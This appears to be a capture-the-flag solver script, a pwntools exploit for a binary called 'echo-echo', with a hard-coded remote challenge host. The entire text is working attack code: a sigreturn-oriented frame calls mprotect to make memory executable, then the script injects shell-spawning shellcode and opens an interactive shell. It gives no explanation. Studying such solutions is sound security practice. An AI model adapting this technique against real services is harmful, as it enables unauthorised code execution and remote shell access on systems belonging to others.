Real solver 
```python
from pwn import *
from sys import *

context.arch = 'amd64'

elf = ELF("./echo-echo")
p = process("./echo-echo")

HOST = "3.97.113.25"
PORT = 9002

cmd = """
b*main
"""

if(argv[1] == 'gdb'):
    gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
    p = remote(HOST,PORT)

syscall = 0x000000000040009b

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x0a        # mprotect
frame.rdi = 0x400000    # base address
frame.rsi = 0x1000      # size
frame.rdx = 7           # permission (rwx)
frame.rsp = 0x4000e8    # symtab pointer to 'vuln'
frame.rip = syscall


payload = b'A'*0x8
payload += p64(elf.sym['_start'])
payload += bytes(frame)

p.send(payload)
sleep(1)

p.send(b'A'*8+p64(syscall)[:-1])

sleep(1)
sc = shellcraft.sh()
p.send(b'A'*8+p64(0x4000f0)+asm(sc))
p.interactive()
```
   